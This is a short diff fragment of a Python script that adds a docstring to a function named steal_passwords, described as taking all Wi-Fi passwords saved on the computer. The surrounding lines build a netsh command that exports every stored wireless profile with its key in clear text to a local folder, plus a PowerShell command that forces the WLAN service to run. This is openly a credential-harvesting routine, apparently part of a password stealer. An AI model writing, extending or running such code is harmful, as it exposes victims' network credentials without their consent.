@@ -4,6 +4,9 @@ import shutil
 
 
 def steal_passwords() -> str:
+    """
+    Takes all the WIFI passwords saved in this computer.
+    """
     path = ".\\WI-FI\\"
     command = f"netsh wlan export profile folder = {path} key=clear"
     command2 = 'Set-Service -Name "Wlansvc" -Status running'
